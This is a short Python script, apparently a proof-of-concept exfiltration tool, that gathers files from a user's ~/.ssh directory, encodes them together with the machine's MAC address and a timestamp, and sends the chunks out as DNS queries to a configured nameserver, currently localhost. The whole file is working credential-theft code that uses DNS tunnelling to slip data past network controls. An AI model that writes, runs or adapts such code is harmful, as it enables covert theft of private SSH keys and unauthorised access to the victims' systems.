from extractor import Extractor
from lib.data_encoder import Encoder 
import hashlib
import dns.resolver
import time
import zlib
from uuid import getnode as get_mac

my_resolver = dns.resolver.Resolver()
my_resolver.nameservers = ['127.0.0.1']

def send_file_to_server(encoded_file):
    results = []
    for part in encoded_file:
        compressed_part = zlib.compress(part.encode('ascii'))
        print(part)
        print(len(part))
        result = my_resolver.query(part)
        results.append(result)
    return results

def _format_timestamp(original_timestamp):
    return str(int(original_timestamp))[-4:]

def encode_file_contents(files, name):
    encoder = Encoder()
    encoded_file_contents = []

    mac_address = str(get_mac())
    for file_name in files:
        with open(file_name, 'r') as f:
            timestamp = str(_format_timestamp(time.time()))
            contents = f.read()
            encoded_file_contents.append(encoder.encode(mac_address, timestamp, name, contents))
    return encoded_file_contents

def send_files_to_server(sensitive_files, server_ip):
    encoded_files = encode_file_contents(sensitive_files, "file")
    results = []
    for file in encoded_files:
        results.append(send_file_to_server(file))
    return results

def start():
    sensitive_files = Extractor().get_sensitive_files('/Users/coldsauce/.ssh')
    send_files_to_server(sensitive_files, '127.0.0.1')

if __name__ == '__main__':
    start()
